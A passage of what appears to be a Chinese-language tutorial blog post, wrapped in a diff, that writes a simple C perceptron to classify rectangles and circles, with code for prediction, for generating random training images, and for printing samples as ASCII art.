+</span></span><span style=display:flex><span>        <span style=color:#ff7b72>for</span> (<span style=color:#ff7b72>int</span> x <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#a5d6ff>0</span>; x <span style=color:#ff7b72;font-weight:700>&lt;</span> WIDTH; <span style=color:#ff7b72;font-weight:700>++</span>x)
+</span></span><span style=display:flex><span>            w[y][x] <span style=color:#ff7b72;font-weight:700>+=</span> img[y][x];
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#8b949e;font-style:italic>// 更新规则：权重 -= 输入（用于矩形误判为圆形时）
+</span></span></span><span style=display:flex><span><span style=color:#8b949e;font-style:italic></span><span style=color:#ff7b72>static</span> <span style=color:#ff7b72>inline</span> <span style=color:#ff7b72>void</span> <span style=color:#d2a8ff;font-weight:700>sub_input</span>(Weights w, <span style=color:#ff7b72>const</span> Image img) {
+</span></span><span style=display:flex><span>    <span style=color:#ff7b72>for</span> (<span style=color:#ff7b72>int</span> y <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#a5d6ff>0</span>; y <span style=color:#ff7b72;font-weight:700>&lt;</span> HEIGHT; <span style=color:#ff7b72;font-weight:700>++</span>y)
+</span></span><span style=display:flex><span>        <span style=color:#ff7b72>for</span> (<span style=color:#ff7b72>int</span> x <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#a5d6ff>0</span>; x <span style=color:#ff7b72;font-weight:700>&lt;</span> WIDTH; <span style=color:#ff7b72;font-weight:700>++</span>x)
+</span></span><span style=display:flex><span>            w[y][x] <span style=color:#ff7b72;font-weight:700>-=</span> img[y][x];
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#8b949e;font-weight:700;font-style:italic>#endif </span><span style=color:#8b949e;font-style:italic>// COMMON_H
+</span></span></span></code></pre></div><h3 id=预测模型>预测模型</h3><p>将上一步准备的几个函数和权重文件以及图片文件捏合起来就可以做到预测了
+我们设定一个BIAS阈值，如果大于则表示图形是一个矩形，小于则是圆，所以可以得到以下代码</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#ff7b72>int</span> <span style=color:#d2a8ff;font-weight:700>main</span>(<span style=color:#ff7b72>int</span> argc, <span style=color:#ff7b72>char</span> <span style=color:#ff7b72;font-weight:700>*</span>argv[]) {
+</span></span><span style=display:flex><span>    <span style=color:#ff7b72>if</span> (argc <span style=color:#ff7b72;font-weight:700>!=</span> <span style=color:#a5d6ff>2</span>) {
+</span></span><span style=display:flex><span>        <span style=color:#d2a8ff;font-weight:700>fprintf</span>(stderr, <span style=color:#a5d6ff>&#34;Usage: %s &lt;image.bin&gt;</span><span style=color:#79c0ff>\n</span><span style=color:#a5d6ff>&#34;</span>, argv[<span style=color:#a5d6ff>0</span>]);
+</span></span><span style=display:flex><span>        <span style=color:#ff7b72>return</span> <span style=color:#a5d6ff>1</span>;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    Weights weights;
+</span></span><span style=display:flex><span>    <span style=color:#d2a8ff;font-weight:700>load_weights</span>(weights, <span style=color:#a5d6ff>&#34;weights.bin&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    Image img;
+</span></span><span style=display:flex><span>    <span style=color:#ff7b72>if</span> (<span style=color:#d2a8ff;font-weight:700>load_image</span>(argv[<span style=color:#a5d6ff>1</span>], img) <span style=color:#ff7b72;font-weight:700>!=</span> <span style=color:#a5d6ff>0</span>) {
+</span></span><span style=display:flex><span>        <span style=color:#d2a8ff;font-weight:700>fprintf</span>(stderr, <span style=color:#a5d6ff>&#34;ERROR: cannot load image %s</span><span style=color:#79c0ff>\n</span><span style=color:#a5d6ff>&#34;</span>, argv[<span style=color:#a5d6ff>1</span>]);
+</span></span><span style=display:flex><span>        <span style=color:#ff7b72>return</span> <span style=color:#a5d6ff>1</span>;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#ff7b72>float</span> out <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#d2a8ff;font-weight:700>feed_forward</span>(img, weights);
+</span></span><span style=display:flex><span>    <span style=color:#d2a8ff;font-weight:700>printf</span>(<span style=color:#a5d6ff>&#34;Weighted sum = %f</span><span style=color:#79c0ff>\n</span><span style=color:#a5d6ff>&#34;</span>, out);
+</span></span><span style=display:flex><span>    <span style=color:#ff7b72>if</span> (out <span style=color:#ff7b72;font-weight:700>&gt;</span> BIAS)
+</span></span><span style=display:flex><span>        <span style=color:#d2a8ff;font-weight:700>printf</span>(<span style=color:#a5d6ff>&#34;Prediction: RECTANGLE</span><span style=color:#79c0ff>\n</span><span style=color:#a5d6ff>&#34;</span>);
+</span></span><span style=display:flex><span>    <span style=color:#ff7b72>else</span> <span style=color:#ff7b72>if</span> (out <span style=color:#ff7b72;font-weight:700>&lt;</span> BIAS)
+</span></span><span style=display:flex><span>        <span style=color:#d2a8ff;font-weight:700>printf</span>(<span style=color:#a5d6ff>&#34;Prediction: CIRCLE</span><span style=color:#79c0ff>\n</span><span style=color:#a5d6ff>&#34;</span>);
+</span></span><span style=display:flex><span>    <span style=color:#ff7b72>else</span>
+</span></span><span style=display:flex><span>        <span style=color:#d2a8ff;font-weight:700>printf</span>(<span style=color:#a5d6ff>&#34;Prediction: UNCERTAIN (exactly at threshold)</span><span style=color:#79c0ff>\n</span><span style=color:#a5d6ff>&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#ff7b72>return</span> <span style=color:#a5d6ff>0</span>;
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><h3 id=训练模型>训练模型</h3><p>光有预测用的工具，没有对应的权重文件怎么办，我们还需要自己手动训练</p><h4 id=训练素材>训练素材</h4><p>如果手搓数百个素材实在是太不健康了，此时就应该自己写一个批量生成素材的小工具</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#8b949e;font-weight:700;font-style:italic>#include</span> <span style=color:#8b949e;font-weight:700;font-style:italic>&lt;stdio.h&gt;</span><span style=color:#8b949e;font-weight:700;font-style:italic>
+</span></span></span><span style=display:flex><span><span style=color:#8b949e;font-weight:700;font-style:italic>#include</span> <span style=color:#8b949e;font-weight:700;font-style:italic>&lt;stdlib.h&gt;</span><span style=color:#8b949e;font-weight:700;font-style:italic>
+</span></span></span><span style=display:flex><span><span style=color:#8b949e;font-weight:700;font-style:italic>#include</span> <span style=color:#8b949e;font-weight:700;font-style:italic>&lt;stdbool.h&gt;</span><span style=color:#8b949e;font-weight:700;font-style:italic>
+</span></span></span><span style=display:flex><span><span style=color:#8b949e;font-weight:700;font-style:italic>#include</span> <span style=color:#8b949e;font-weight:700;font-style:italic>&lt;string.h&gt;</span><span style=color:#8b949e;font-weight:700;font-style:italic>
+</span></span></span><span style=display:flex><span><span style=color:#8b949e;font-weight:700;font-style:italic>#include</span> <span style=color:#8b949e;font-weight:700;font-style:italic>&lt;errno.h&gt;</span><span style=color:#8b949e;font-weight:700;font-style:italic>
+</span></span></span><span style=display:flex><span><span style=color:#8b949e;font-weight:700;font-style:italic>#include</span> <span style=color:#8b949e;font-weight:700;font-style:italic>&lt;sys/stat.h&gt;</span><span style=color:#8b949e;font-weight:700;font-style:italic>
+</span></span></span><span style=display:flex><span><span style=color:#8b949e;font-weight:700;font-style:italic></span>
+</span></span><span style=display:flex><span><span style=color:#8b949e;font-weight:700;font-style:italic>#define WIDTH       20
+</span></span></span><span style=display:flex><span><span style=color:#8b949e;font-weight:700;font-style:italic>#define HEIGHT      20
+</span></span></span><span style=display:flex><span><span style=color:#8b949e;font-weight:700;font-style:italic>#define SAMPLE_SIZE 500          </span><span style=color:#8b949e;font-style:italic>// 每类样本数量（矩形和圆形各生成这么多）
+</span></span></span><span style=display:flex><span><span style=color:#8b949e;font-style:italic></span><span style=color:#8b949e;font-weight:700;font-style:italic>#define DATA_DIR    &#34;./train_data&#34;
+</span></span></span><span style=display:flex><span><span style=color:#8b949e;font-weight:700;font-style:italic>#define RANDOM_SEED 42          </span><span style=color:#8b949e;font-style:italic>// 固定随机种子，使样本可复现
+</span></span></span><span style=display:flex><span><span style=color:#8b949e;font-style:italic></span>
+</span></span><span style=display:flex><span><span style=color:#ff7b72>static</span> <span style=color:#ff7b72>inline</span> <span style=color:#ff7b72>int</span> <span style=color:#d2a8ff;font-weight:700>rand_range</span>(<span style=color:#ff7b72>int</span> low, <span style=color:#ff7b72>int</span> high) {
+</span></span><span style=display:flex><span>    <span style=color:#ff7b72>return</span> <span style=color:#d2a8ff;font-weight:700>rand</span>() <span style=color:#ff7b72;font-weight:700>%</span> (high <span style=color:#ff7b72;font-weight:700>-</span> low) <span style=color:#ff7b72;font-weight:700>+</span> low;
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#ff7b72>static</span> <span style=color:#ff7b72>void</span> <span style=color:#d2a8ff;font-weight:700>ensure_dir</span>(<span style=color:#ff7b72>const</span> <span style=color:#ff7b72>char</span> <span style=color:#ff7b72;font-weight:700>*</span>path) {
+</span></span><span style=display:flex><span>    <span style=color:#ff7b72>struct</span> stat st;
+</span></span><span style=display:flex><span>    <span style=color:#ff7b72>if</span> (<span style=color:#d2a8ff;font-weight:700>stat</span>(path, <span style=color:#ff7b72;font-weight:700>&amp;</span>st) <span style=color:#ff7b72;font-weight:700>==</span> <span style=color:#ff7b72;font-weight:700>-</span><span style=color:#a5d6ff>1</span>) {
+</span></span><span style=display:flex><span>        <span style=color:#ff7b72>if</span> (<span style=color:#d2a8ff;font-weight:700>mkdir</span>(path, <span style=color:#a5d6ff>0755</span>) <span style=color:#ff7b72;font-weight:700>==</span> <span style=color:#ff7b72;font-weight:700>-</span><span style=color:#a5d6ff>1</span>) {
+</span></span><span style=display:flex><span>            <span style=color:#d2a8ff;font-weight:700>fprintf</span>(stderr, <span style=color:#a5d6ff>&#34;ERROR: cannot create directory %s: %s</span><span style=color:#79c0ff>\n</span><span style=color:#a5d6ff>&#34;</span>,
+</span></span><span style=display:flex><span>                    path, <span style=color:#d2a8ff;font-weight:700>strerror</span>(errno));
+</span></span><span style=display:flex><span>            <span style=color:#d2a8ff;font-weight:700>exit</span>(<span style=color:#a5d6ff>1</span>);
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#ff7b72>void</span> <span style=color:#d2a8ff;font-weight:700>generate_random_rect</span>(<span style=color:#ff7b72>unsigned</span> <span style=color:#ff7b72>char</span> img[HEIGHT][WIDTH]) {
+</span></span><span style=display:flex><span>    <span style=color:#d2a8ff;font-weight:700>memset</span>(img, <span style=color:#a5d6ff>0</span>, HEIGHT <span style=color:#ff7b72;font-weight:700>*</span> WIDTH <span style=color:#ff7b72;font-weight:700>*</span> <span style=color:#ff7b72>sizeof</span>(<span style=color:#ff7b72>unsigned</span> <span style=color:#ff7b72>char</span>));
+</span></span><span style=display:flex><span>    <span style=color:#ff7b72>int</span> x <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#d2a8ff;font-weight:700>rand_range</span>(<span style=color:#a5d6ff>0</span>, WIDTH);
+</span></span><span style=display:flex><span>    <span style=color:#ff7b72>int</span> y <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#d2a8ff;font-weight:700>rand_range</span>(<span style=color:#a5d6ff>0</span>, HEIGHT);
+</span></span><span style=display:flex><span>    <span style=color:#ff7b72>int</span> w <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#d2a8ff;font-weight:700>rand_range</span>(<span style=color:#a5d6ff>1</span>, WIDTH <span style=color:#ff7b72;font-weight:700>-</span> x <span style=color:#ff7b72;font-weight:700>+</span> <span style=color:#a5d6ff>1</span>);
+</span></span><span style=display:flex><span>    <span style=color:#ff7b72>int</span> h <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#d2a8ff;font-weight:700>rand_range</span>(<span style=color:#a5d6ff>1</span>, HEIGHT <span style=color:#ff7b72;font-weight:700>-</span> y <span style=color:#ff7b72;font-weight:700>+</span> <span style=color:#a5d6ff>1</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#ff7b72>for</span> (<span style=color:#ff7b72>int</span> dy <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#a5d6ff>0</span>; dy <span style=color:#ff7b72;font-weight:700>&lt;</span> h; <span style=color:#ff7b72;font-weight:700>++</span>dy) {
+</span></span><span style=display:flex><span>        <span style=color:#ff7b72>for</span> (<span style=color:#ff7b72>int</span> dx <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#a5d6ff>0</span>; dx <span style=color:#ff7b72;font-weight:700>&lt;</span> w; <span style=color:#ff7b72;font-weight:700>++</span>dx) {
+</span></span><span style=display:flex><span>            img[y <span style=color:#ff7b72;font-weight:700>+</span> dy][x <span style=color:#ff7b72;font-weight:700>+</span> dx] <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#a5d6ff>1</span>;
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#ff7b72>void</span> <span style=color:#d2a8ff;font-weight:700>generate_random_circle</span>(<span style=color:#ff7b72>unsigned</span> <span style=color:#ff7b72>char</span> img[HEIGHT][WIDTH]) {
+</span></span><span style=display:flex><span>    <span style=color:#d2a8ff;font-weight:700>memset</span>(img, <span style=color:#a5d6ff>0</span>, HEIGHT <span style=color:#ff7b72;font-weight:700>*</span> WIDTH <span style=color:#ff7b72;font-weight:700>*</span> <span style=color:#ff7b72>sizeof</span>(<span style=color:#ff7b72>unsigned</span> <span style=color:#ff7b72>char</span>));
+</span></span><span style=display:flex><span>    <span style=color:#ff7b72>int</span> cx <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#d2a8ff;font-weight:700>rand_range</span>(<span style=color:#a5d6ff>0</span>, WIDTH);
+</span></span><span style=display:flex><span>    <span style=color:#ff7b72>int</span> cy <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#d2a8ff;font-weight:700>rand_range</span>(<span style=color:#a5d6ff>0</span>, HEIGHT);
+</span></span><span style=display:flex><span>    <span style=color:#ff7b72>int</span> max_r <span style=color:#ff7b72;font-weight:700>=</span> cx;
+</span></span><span style=display:flex><span>    <span style=color:#ff7b72>if</span> (cy <span style=color:#ff7b72;font-weight:700>&lt;</span> max_r) max_r <span style=color:#ff7b72;font-weight:700>=</span> cy;
+</span></span><span style=display:flex><span>    <span style=color:#ff7b72>if</span> (WIDTH <span style=color:#ff7b72;font-weight:700>-</span> <span style=color:#a5d6ff>1</span> <span style=color:#ff7b72;font-weight:700>-</span> cx <span style=color:#ff7b72;font-weight:700>&lt;</span> max_r) max_r <span style=color:#ff7b72;font-weight:700>=</span> WIDTH <span style=color:#ff7b72;font-weight:700>-</span> <span style=color:#a5d6ff>1</span> <span style=color:#ff7b72;font-weight:700>-</span> cx;
+</span></span><span style=display:flex><span>    <span style=color:#ff7b72>if</span> (HEIGHT <span style=color:#ff7b72;font-weight:700>-</span> <span style=color:#a5d6ff>1</span> <span style=color:#ff7b72;font-weight:700>-</span> cy <span style=color:#ff7b72;font-weight:700>&lt;</span> max_r) max_r <span style=color:#ff7b72;font-weight:700>=</span> HEIGHT <span style=color:#ff7b72;font-weight:700>-</span> <span style=color:#a5d6ff>1</span> <span style=color:#ff7b72;font-weight:700>-</span> cy;
+</span></span><span style=display:flex><span>    <span style=color:#ff7b72>if</span> (max_r <span style=color:#ff7b72;font-weight:700>&lt;</span> <span style=color:#a5d6ff>1</span>) max_r <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#a5d6ff>1</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#ff7b72>int</span> r <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#d2a8ff;font-weight:700>rand_range</span>(<span style=color:#a5d6ff>1</span>, max_r <span style=color:#ff7b72;font-weight:700>+</span> <span style=color:#a5d6ff>1</span>);
+</span></span><span style=display:flex><span>    <span style=color:#ff7b72>for</span> (<span style=color:#ff7b72>int</span> y <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#a5d6ff>0</span>; y <span style=color:#ff7b72;font-weight:700>&lt;</span> HEIGHT; <span style=color:#ff7b72;font-weight:700>++</span>y) {
+</span></span><span style=display:flex><span>        <span style=color:#ff7b72>for</span> (<span style=color:#ff7b72>int</span> x <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#a5d6ff>0</span>; x <span style=color:#ff7b72;font-weight:700>&lt;</span> WIDTH; <span style=color:#ff7b72;font-weight:700>++</span>x) {
+</span></span><span style=display:flex><span>            <span style=color:#ff7b72>int</span> dx <span style=color:#ff7b72;font-weight:700>=</span> x <span style=color:#ff7b72;font-weight:700>-</span> cx;
+</span></span><span style=display:flex><span>            <span style=color:#ff7b72>int</span> dy <span style=color:#ff7b72;font-weight:700>=</span> y <span style=color:#ff7b72;font-weight:700>-</span> cy;
+</span></span><span style=display:flex><span>            <span style=color:#ff7b72>if</span> (dx <span style=color:#ff7b72;font-weight:700>*</span> dx <span style=color:#ff7b72;font-weight:700>+</span> dy <span style=color:#ff7b72;font-weight:700>*</span> dy <span style=color:#ff7b72;font-weight:700>&lt;=</span> r <span style=color:#ff7b72;font-weight:700>*</span> r) {
+</span></span><span style=display:flex><span>                img[y][x] <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#a5d6ff>1</span>;
+</span></span><span style=display:flex><span>            }
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#ff7b72>void</span> <span style=color:#d2a8ff;font-weight:700>save_image</span>(<span style=color:#ff7b72>const</span> <span style=color:#ff7b72>unsigned</span> <span style=color:#ff7b72>char</span> img[HEIGHT][WIDTH], <span style=color:#ff7b72>const</span> <span style=color:#ff7b72>char</span> <span style=color:#ff7b72;font-weight:700>*</span>filename) {
+</span></span><span style=display:flex><span>    FILE <span style=color:#ff7b72;font-weight:700>*</span>f <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#d2a8ff;font-weight:700>fopen</span>(filename, <span style=color:#a5d6ff>&#34;wb&#34;</span>);
+</span></span><span style=display:flex><span>    <span style=color:#ff7b72>if</span> (<span style=color:#ff7b72;font-weight:700>!</span>f) {
+</span></span><span style=display:flex><span>        <span style=color:#d2a8ff;font-weight:700>fprintf</span>(stderr, <span style=color:#a5d6ff>&#34;ERROR: cannot open %s for writing: %s</span><span style=color:#79c0ff>\n</span><span style=color:#a5d6ff>&#34;</span>,
+</span></span><span style=display:flex><span>                filename, <span style=color:#d2a8ff;font-weight:700>strerror</span>(errno));
+</span></span><span style=display:flex><span>        <span style=color:#d2a8ff;font-weight:700>exit</span>(<span style=color:#a5d6ff>1</span>);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    <span style=color:#8b949e;font-style:italic>// 直接写入 HEIGHT*WIDTH 个字节，每个字节是0或1
+</span></span></span><span style=display:flex><span><span style=color:#8b949e;font-style:italic></span>    <span style=color:#d2a8ff;font-weight:700>fwrite</span>(img, <span style=color:#ff7b72>sizeof</span>(<span style=color:#ff7b72>unsigned</span> <span style=color:#ff7b72>char</span>), HEIGHT <span style=color:#ff7b72;font-weight:700>*</span> WIDTH, f);
+</span></span><span style=display:flex><span>    <span style=color:#d2a8ff;font-weight:700>fclose</span>(f);
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#ff7b72>void</span> <span style=color:#d2a8ff;font-weight:700>generate_all_samples</span>(<span style=color:#ff7b72>void</span>) {
+</span></span><span style=display:flex><span>    <span style=color:#ff7b72>unsigned</span> <span style=color:#ff7b72>char</span> img[HEIGHT][WIDTH];
+</span></span><span style=display:flex><span>    <span style=color:#ff7b72>for</span> (<span style=color:#ff7b72>int</span> i <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#a5d6ff>0</span>; i <span style=color:#ff7b72;font-weight:700>&lt;</span> SAMPLE_SIZE; <span style=color:#ff7b72;font-weight:700>++</span>i) {
+</span></span><span style=display:flex><span>        <span style=color:#d2a8ff;font-weight:700>generate_random_rect</span>(img);
+</span></span><span style=display:flex><span>        <span style=color:#ff7b72>char</span> filename[<span style=color:#a5d6ff>256</span>];
+</span></span><span style=display:flex><span>        <span style=color:#d2a8ff;font-weight:700>snprintf</span>(filename, <span style=color:#ff7b72>sizeof</span>(filename), <span style=color:#a5d6ff>&#34;%s/rect_%03d.bin&#34;</span>, DATA_DIR, i);
+</span></span><span style=display:flex><span>        <span style=color:#d2a8ff;font-weight:700>save_image</span>(img, filename);
+</span></span><span style=display:flex><span>        <span style=color:#d2a8ff;font-weight:700>printf</span>(<span style=color:#a5d6ff>&#34;[INFO] generated %s</span><span style=color:#79c0ff>\n</span><span style=color:#a5d6ff>&#34;</span>, filename);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    <span style=color:#ff7b72>for</span> (<span style=color:#ff7b72>int</span> i <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#a5d6ff>0</span>; i <span style=color:#ff7b72;font-weight:700>&lt;</span> SAMPLE_SIZE; <span style=color:#ff7b72;font-weight:700>++</span>i) {
+</span></span><span style=display:flex><span>        <span style=color:#d2a8ff;font-weight:700>generate_random_circle</span>(img);
+</span></span><span style=display:flex><span>        <span style=color:#ff7b72>char</span> filename[<span style=color:#a5d6ff>256</span>];
+</span></span><span style=display:flex><span>        <span style=color:#d2a8ff;font-weight:700>snprintf</span>(filename, <span style=color:#ff7b72>sizeof</span>(filename), <span style=color:#a5d6ff>&#34;%s/circle_%03d.bin&#34;</span>, DATA_DIR, i);
+</span></span><span style=display:flex><span>        <span style=color:#d2a8ff;font-weight:700>save_image</span>(img, filename);
+</span></span><span style=display:flex><span>        <span style=color:#d2a8ff;font-weight:700>printf</span>(<span style=color:#a5d6ff>&#34;[INFO] generated %s</span><span style=color:#79c0ff>\n</span><span style=color:#a5d6ff>&#34;</span>, filename);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#ff7b72>int</span> <span style=color:#d2a8ff;font-weight:700>main</span>(<span style=color:#ff7b72>void</span>) {
+</span></span><span style=display:flex><span>    <span style=color:#d2a8ff;font-weight:700>srand</span>(RANDOM_SEED);
+</span></span><span style=display:flex><span>    <span style=color:#d2a8ff;font-weight:700>ensure_dir</span>(DATA_DIR);
+</span></span><span style=display:flex><span>    <span style=color:#d2a8ff;font-weight:700>generate_all_samples</span>();
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#d2a8ff;font-weight:700>printf</span>(<span style=color:#a5d6ff>&#34;[INFO] Done. Generated %d rectangles and %d circles in %s</span><span style=color:#79c0ff>\n</span><span style=color:#a5d6ff>&#34;</span>,
+</span></span><span style=display:flex><span>           SAMPLE_SIZE, SAMPLE_SIZE, DATA_DIR);
+</span></span><span style=display:flex><span>    <span style=color:#ff7b72>return</span> <span style=color:#a5d6ff>0</span>;
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>按照这里，批量搓了两种素材各500分，当然你要是想检查一下素材也可以再整一个检查的工具</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#8b949e;font-weight:700;font-style:italic>#include</span> <span style=color:#8b949e;font-weight:700;font-style:italic>&lt;stdio.h&gt;</span><span style=color:#8b949e;font-weight:700;font-style:italic>
+</span></span></span><span style=display:flex><span><span style=color:#8b949e;font-weight:700;font-style:italic>#include</span> <span style=color:#8b949e;font-weight:700;font-style:italic>&lt;stdlib.h&gt;</span><span style=color:#8b949e;font-weight:700;font-style:italic>
+</span></span></span><span style=display:flex><span><span style=color:#8b949e;font-weight:700;font-style:italic>#include</span> <span style=color:#8b949e;font-weight:700;font-style:italic>&lt;string.h&gt;</span><span style=color:#8b949e;font-weight:700;font-style:italic>
+</span></span></span><span style=display:flex><span><span style=color:#8b949e;font-weight:700;font-style:italic>#include</span> <span style=color:#8b949e;font-weight:700;font-style:italic>&lt;errno.h&gt;</span><span style=color:#8b949e;font-weight:700;font-style:italic>
+</span></span></span><span style=display:flex><span><span style=color:#8b949e;font-weight:700;font-style:italic></span>
+</span></span><span style=display:flex><span><span style=color:#8b949e;font-weight:700;font-style:italic>#define WIDTH  20
+</span></span></span><span style=display:flex><span><span style=color:#8b949e;font-weight:700;font-style:italic>#define HEIGHT 20
+</span></span></span><span style=display:flex><span><span style=color:#8b949e;font-weight:700;font-style:italic>#define DATA_DIR &#34;./train_data&#34;
+</span></span></span><span style=display:flex><span><span style=color:#8b949e;font-weight:700;font-style:italic></span>
+</span></span><span style=display:flex><span><span style=color:#8b949e;font-style:italic>// 打印图像：&#39;#&#39; 表示1（形状部分），&#39;.&#39; 表示0（背景）
+</span></span></span><span style=display:flex><span><span style=color:#8b949e;font-style:italic></span><span style=color:#ff7b72>static</span> <span style=color:#ff7b72>void</span> <span style=color:#d2a8ff;font-weight:700>print_image</span>(<span style=color:#ff7b72>const</span> <span style=color:#ff7b72>unsigned</span> <span style=color:#ff7b72>char</span> img[HEIGHT][WIDTH]) {
+</span></span><span style=display:flex><span>    <span style=color:#d2a8ff;font-weight:700>printf</span>(<span style=color:#a5d6ff>&#34;+&#34;</span>);
+</span></span><span style=display:flex><span>    <span style=color:#ff7b72>for</span> (<span style=color:#ff7b72>int</span> x <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#a5d6ff>0</span>; x <span style=color:#ff7b72;font-weight:700>&lt;</span> WIDTH; <span style=color:#ff7b72;font-weight:700>++</span>x)
+</span></span><span style=display:flex><span>        <span style=color:#d2a8ff;font-weight:700>printf</span>(<span style=color:#a5d6ff>&#34;-&#34;</span>);
+</span></span><span style=display:flex><span>    <span style=color:#d2a8ff;font-weight:700>printf</span>(<span style=color:#a5d6ff>&#34;+</span><span style=color:#79c0ff>\n</span><span style=color:#a5d6ff>&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#ff7b72>for</span> (<span style=color:#ff7b72>int</span> y <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#a5d6ff>0</span>; y <span style=color:#ff7b72;font-weight:700>&lt;</span> HEIGHT; <span style=color:#ff7b72;font-weight:700>++</span>y) {
+</span></span><span style=display:flex><span>        <span style=color:#d2a8ff;font-weight:700>printf</span>(<span style=color:#a5d6ff>&#34;|&#34;</span>);
+</span></span><span style=display:flex><span>        <span style=color:#ff7b72>for</span> (<span style=color:#ff7b72>int</span> x <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#a5d6ff>0</span>; x <span style=color:#ff7b72;font-weight:700>&lt;</span> WIDTH; <span style=color:#ff7b72;font-weight:700>++</span>x) {
+</span></span><span style=display:flex><span>            <span style=color:#d2a8ff;font-weight:700>putchar</span>(img[y][x] <span style=color:#ff7b72;font-weight:700>?</span> <span style=color:#a5d6ff>&#39;#&#39;</span> <span style=color:#ff7b72;font-weight:700>:</span> <span style=color:#a5d6ff>&#39;.&#39;</span>);
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>        <span style=color:#d2a8ff;font-weight:700>printf</span>(<span style=color:#a5d6ff>&#34;|</span><span style=color:#79c0ff>\n</span><span style=color:#a5d6ff>&#34;</span>);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#d2a8ff;font-weight:700>printf</span>(<span style=color:#a5d6ff>&#34;+&#34;</span>);
+</span></span><span style=display:flex><span>    <span style=color:#ff7b72>for</span> (<span style=color:#ff7b72>int</span> x <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#a5d6ff>0</span>; x <span style=color:#ff7b72;font-weight:700>&lt;</span> WIDTH; <span style=color:#ff7b72;font-weight:700>++</span>x)
+</span></span><span style=display:flex><span>        <span style=color:#d2a8ff;font-weight:700>printf</span>(<span style=color:#a5d6ff>&#34;-&#34;</span>);
+</span></span><span style=display:flex><span>    <span style=color:#d2a8ff;font-weight:700>printf</span>(<span style=color:#a5d6ff>&#34;+</span><span style=color:#79c0ff>\n</span><span style=color:#a5d6ff>&#34;</span>);
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#ff7b72>int</span> <span style=color:#d2a8ff;font-weight:700>main</span>(<span style=color:#ff7b72>int</span> argc, <span style=color:#ff7b72>char</span> <span style=color:#ff7b72;font-weight:700>*</span>argv[]) {
+</span></span><span style=display:flex><span>    <span style=color:#ff7b72>if</span> (argc <span style=color:#ff7b72;font-weight:700>!=</span> <span style=color:#a5d6ff>2</span>) {
